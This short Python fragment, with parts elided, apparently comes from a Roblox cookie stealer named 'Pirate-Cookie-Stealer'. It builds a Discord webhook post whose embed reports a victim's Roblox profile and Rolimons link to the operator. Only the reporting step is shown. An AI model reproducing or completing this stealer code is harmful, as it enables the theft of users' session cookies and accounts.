...
discord.post(
    username="BOT - Pirate 🍪 - Mani is a skid",
    ...
    embeds=[
        {
            ...
            "description" : f"[Github Page](https://github.com/syntheticc/Pirate-Cookie-Stealer) | [Rolimons]({rolimons}) | [Roblox Profile]({roblox_profile})",
            "color" : 12452044,
            "fields": [
